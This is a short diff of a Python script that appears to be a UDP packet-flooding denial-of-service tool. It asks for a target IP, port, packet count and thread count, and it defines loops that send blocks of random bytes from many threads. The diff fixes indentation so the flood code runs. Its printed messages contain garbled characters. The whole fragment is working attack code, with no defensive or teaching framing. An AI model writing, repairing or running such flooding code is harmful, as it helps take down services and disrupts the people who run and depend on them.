@@ -35,7 +35,8 @@ ip = str(input("\033[1;32m IP Target \033[1;32m<===> "))
 port = int(input("\033[1;32m Port Target \033[1;32m<===> "))
 times = int(input("\033[1;32m Enter Packets \033[1;32m<===> "))
 threads = int(input("\033[1;32m Enter Threads \033[1;32m<===> "))
-  def xxbr():
+
+def xxbr():
   	data = random._urandom(1050)
   	while True:
   		try:
@@ -51,7 +52,7 @@ threads = int(input("\033[1;32m Enter Threads \033[1;32m<===> "))
   		except:
   			print("\033[1;31mÃ— Warning!")
   
-  def xxbr2():
+def xxbr2():
   	data = random._urandom(102400)
   	while True:
   		try:
@@ -65,7 +66,7 @@ threads = int(input("\033[1;32m Enter Threads \033[1;32m<===> "))
   			s.close()
   			print("\033[1;33mÃ— Warning!")
               
-  for y in range(threads):
+for y in range(threads):
   	if choice == 'Udp':
   		th = threading.Thread(target = KINGBOBAttack)
   		th.start()
